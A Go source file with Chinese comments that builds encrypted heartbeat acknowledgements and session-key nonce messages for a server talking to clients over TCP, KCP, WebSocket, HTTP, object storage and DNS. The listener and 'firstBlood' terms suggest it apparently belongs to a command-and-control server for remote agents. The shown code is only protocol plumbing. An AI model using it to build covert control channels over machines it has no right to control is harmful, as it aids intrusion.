package command

import (
	"crypto/rand"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/utils"
	"encoding/binary"
)

// BuildHeartbeatAckBytes 构建心跳 ack 载荷：type=3 空载荷，经会话密钥加密后 base64。
// 供各持久连接协议（TCP/KCP/WS）在收到客户端心跳时回复，
// 使客户端读侧不再长期静默，可用读超时兜底探测半开连接。
// 返回的 []byte 为 base64 密文（TCP/KCP 需再按协议加长度头，WS 直接作为二进制消息发送）。
func BuildHeartbeatAckBytes(uid string) []byte {
	ackBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(ackBytes, 3)
	cmdBytes, err := encrypt.EncryptWithSessionKey(ackBytes, uid)
	if err != nil {
		// 【加密体系改造】加密失败不发送 ack（客户端读超时兜底重连）
		return nil
	}
	cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
	return cmdBase64
}

// FrameHeartbeatAck 将心跳 ack base64 载荷按 TCP/KCP 帧格式加长度头
func FrameHeartbeatAck(cmdBase64 []byte) []byte {
	return utils.BytesCombine(utils.WriteInt(len(cmdBase64)), cmdBase64)
}

// SessionNonceMsgType 会话密钥协商消息类型（服务端→客户端，携带每连接随机 nonce）
const SessionNonceMsgType = 4

// BuildSessionNonceMsg 生成 nonce 并经服务端重派生会话密钥，返回待下发的加密消息帧
// （length|base64(4|nonce)，用上一密钥（初始）加密）。返回 nil 表示协商失败（跳过下发）。
// 调用前提：客户端已完成初始派生（CurrentKey=初始），服务端已通过
// DeriveSessionKeyForListenerWithKeys 派生初始密钥。
func BuildSessionNonceMsg(uid string, salt, masterKey []byte) []byte {
	if encrypt.GlobalKeyManager == nil {
		return nil
	}
	nonce := make([]byte, 16)
	if _, err := rand.Read(nonce); err != nil {
		return nil
	}
	initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, salt, masterKey, salt, nonce)
	if err != nil {
		return nil
	}
	// type=4 | nonce，用初始密钥加密（客户端当前仍用初始密钥，能解密）
	msg := utils.BytesCombine(utils.WriteInt(SessionNonceMsgType), nonce)
	encrypted, err := encrypt.SecureEncrypt(msg, initialKey)
	if err != nil {
		return nil
	}
	// 返回 base64 载荷（不含长度帧；TCP/KCP 由协议层加长度头，WS 直接作为二进制消息）
	b64, _ := encrypt.EncodeBase64(encrypted)
	return b64
}

// BuildSessionNonceMsgWithKey 用给定初始密钥加密 nonce 协商消息（type=4|nonce），返回 base64 载荷。
// 与 BuildSessionNonceMsg 的区别：不执行密钥旋转——轮询协议（HTTP/OSS/DNS）在 firstBlood
// 派生成功后即旋转并暂存（encrypt.StorePendingNonce），待客户端下次轮询时用本函数加密下发。
func BuildSessionNonceMsgWithKey(initialKey, nonce []byte) []byte {
	if len(initialKey) == 0 || len(nonce) == 0 {
		return nil
	}
	msg := utils.BytesCombine(utils.WriteInt(SessionNonceMsgType), nonce)
	encrypted, err := encrypt.SecureEncrypt(msg, initialKey)
	if err != nil {
		return nil
	}
	b64, _ := encrypt.EncodeBase64(encrypted)
	return b64
}
